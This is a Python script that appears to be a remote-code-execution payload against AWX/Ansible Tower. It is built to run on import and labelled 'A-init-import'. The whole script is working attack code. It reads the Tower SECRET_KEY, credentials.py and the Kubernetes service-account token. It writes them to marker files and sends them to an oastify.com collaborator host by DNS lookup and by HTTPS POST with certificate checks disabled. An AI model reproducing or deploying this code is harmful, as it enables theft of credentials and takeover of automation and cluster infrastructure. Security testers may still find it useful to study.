import os, json, socket

def _exfil():
    errs = []
    uid = str(os.getuid())
    try:
        import subprocess
        uid = subprocess.check_output(["id"], timeout=5).decode().strip()
    except Exception:
        pass

    secrets = {}
    for label, path in {
        "secret_key": "/etc/tower/SECRET_KEY",
        "credentials_py": "/etc/tower/conf.d/credentials.py",
        "k8s_token": "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "k8s_namespace": "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    }.items():
        try:
            with open(path) as f:
                secrets[label] = f.read().strip()
        except Exception:
            secrets[label] = "NOT_FOUND"

    # --- File markers (multiple locations) ---
    for mp in ["/tmp/_rce", os.path.join(os.getcwd(), "_rce_marker.txt"),
               "/var/lib/awx/projects/_rce_marker.txt"]:
        try:
            with open(mp, "w") as f:
                f.write(uid + "\n" + json.dumps(secrets, default=str)[:500] + "\n")
                f.write("errors:" + ",".join(errs) + "\n")
        except Exception as e:
            errs.append(str(e))

    # --- DNS exfil (works through proxies) ---
    try:
        sk = secrets.get("secret_key", "none")[:50]
        safe = "".join(c if c.isalnum() or c == "-" else "-" for c in sk)[:50]
        socket.getaddrinfo(f"rce.{safe}.jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com", 80)
    except Exception as e:
        errs.append("dns:" + str(e))

    # --- HTTP POST ---
    try:
        import urllib.request, ssl
        ctx = ssl._create_unverified_context()
        data = json.dumps({
            "vector": "A-init-import",
            "user": uid,
            "cwd": os.getcwd(),
            "secrets": secrets,
            "errors": errs,
        }, default=str).encode()
        req = urllib.request.Request(
            "https://jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com/vector-a-init-rce",
            data=data,
            headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=15, context=ctx)
    except Exception as e:
        errs.append("http:" + str(e))

try:
    _exfil()
except Exception:
    pass
